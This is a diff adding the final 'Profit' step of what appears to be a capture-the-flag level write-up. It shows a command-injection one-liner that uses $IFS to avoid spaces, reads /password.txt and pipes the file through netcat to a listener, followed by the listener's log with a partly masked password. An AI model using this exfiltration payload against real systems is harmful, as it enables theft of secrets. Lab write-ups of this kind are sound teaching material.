@@ -156,3 +156,18 @@ Let's see if we can get a simple message back:
 ![borat](/assets/images/bm8-1.png)
 
 ## 3 - Profit
+
+We have to read the password stored in password.txt, in the root of the chroot environment:
+
+```
+(in the level4 console)
+$ IP=0&&PORT=2000&&cat$IFS/password.txt|nc.openbsd$IFS-nvv$IFS$IP$IFS$PORT
+
+(on the listener)
+$ nc -lvvp 2000
+Listening on [0.0.0.0] (family 0, port 2000)
+Connection from [127.0.0.1] port 2000 [tcp/cisco-sccp] accepted (family 2, sport 51920)
+only*******s
+```
+
+This concludes the level. in the [next leve] we'll analyse another interestting vulnerability - [Time of check to time of use -TOCTOU](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use).
